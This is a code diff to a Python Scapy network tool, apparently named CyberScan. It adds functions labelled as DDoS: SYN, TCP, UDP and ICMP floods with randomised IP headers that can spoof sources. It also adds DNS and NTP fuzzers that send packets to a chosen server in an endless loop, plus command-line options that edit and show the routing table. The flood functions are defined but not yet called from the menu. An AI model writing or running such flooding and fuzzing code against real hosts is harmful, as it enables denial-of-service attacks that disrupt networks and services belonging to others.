@@ -21,6 +21,7 @@ import sys
 import platform
 import argparse
 import time
+import threading
 import socket
 
 from scapy.all import *
@@ -88,8 +89,63 @@ def write(string):
     sys.stdout.flush()
     sys.stdout.flush()
 
+def fuzz_dns(host):
+    print "start fuzz dns" 
+    send(IP(dst=host)/UDP()/fuzz(DNS()), inter=1,loop=1)
+    print "end fuzz dns"	
+	
+def fuzz_tcp(host):
+    print "fuzz start"
+    send(IP(dst=host)/fuzz(UDP()/NTP(version=4)),loop=1)
+    print "end fuzz tcp"
+
+# ddos start
+def syn_flood(host,port):
+    print "start syn flood"
+    ip = fuzz(IP(dst=host))
+    syn = fuzz(TCP(dport=port,flags='S'))
+    send(ip/syn,verbose=0)
+    print " end syn flood"	
+
+def tcp_flood(host,port):
+    print "start tcp flood"
+    ip = fuzz(IP(dst=host))
+    tcp = fuzz(TCP(dport=port))
+    send(ip/tcp,verbose=0)
+    print "end tcp flood"
 
 
+def udp_flood(host,port):
+    print "start udp flood"
+    ip = fuzz(IP(dst=host))
+    udp = fuzz(UDP(dport=port))
+    send(ip/udp, verbose=0)
+    print "end udp flood"
+
+def icmp_flood(host):
+    print "start icmp flood"
+    ip = fuzz(IP(dst=host))
+    icmp = fuzz(ICMP())
+    send(ip/icmp,verbose=0)
+    print "end icmp flood"
+ 
+#ddos end
+
+
+
+
+def route_table():
+    print conf.route
+
+def add_route_table(host,gw):
+    conf.route.add(host, gw)
+    conf.route.resync()
+    print conf.route	
+
+def resync_route__table():
+    conf.route.resync()
+    
+	
 def arp_ping(host):
     print '[*] Starting CyberScan Ping ARP for %s' %(host)
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=host), timeout=2)
@@ -285,7 +341,7 @@ def pcap_analyser_tcp(file):
 	PSH = 0X08
 	ACK = 0X10
 	URG = 0x20
-
+	
 	for pkt in pkts:
 			
 		if pkt.haslayer(TCP):
@@ -400,6 +456,8 @@ def main():
 	global eport
 	global file
 	global flag
+	global gw
+	global options
 	flag=0
 	
 	
@@ -417,6 +475,9 @@ levels with pcap file:
   tcp : extract tcp headers
   udp : extract udp headers
 
+None : 
+route : view routing table
+
                     ''')
 
 	parser.add_argument("-s","--serveur", dest="serveur",help="attack to serveur ip -s")
@@ -425,6 +486,8 @@ levels with pcap file:
 	parser.add_argument("-t","--eport",dest="eport",help="-end_port")
 	parser.add_argument("-f", "--file", dest="file",
                       help="read pcap file")
+	parser.add_argument("-gw",dest="gateway",help="add gateway")
+	parser.add_argument("--options",dest="options",help="view routing table")
 
 	args = parser.parse_args()
 	serveur = args.serveur
@@ -432,6 +495,9 @@ levels with pcap file:
 	level = args.level
 	sport = args.sport 
 	eport = args.eport
+	gw = args.gateway	
+	options= args.options
+	
 	header()
 	usage()
 	if file and level == "eth":
@@ -466,6 +532,27 @@ levels with pcap file:
 	elif serveur is not None and level == "udp":
 	    #port = 0
 	    udp_ping(serveur,port=0)
+
+	# fuzz start
+
+	elif serveur is not None and level== "fuzz_dns":
+	    fuzz_dns(serveur)
+	elif serveur is not None and level== "fuzz_tcp":
+	    fuzz_tcp(serveur)
+	
+	#fuzz end
+
+	# start syn flood "
+	
+	
+
+	# end syn flood
+
+	elif serveur is not None and level == "addroute" and gw is not None:
+	    add_route_table(serveur,gw)
+
+	elif options == "route":
+	    route_table()
 
 	
              
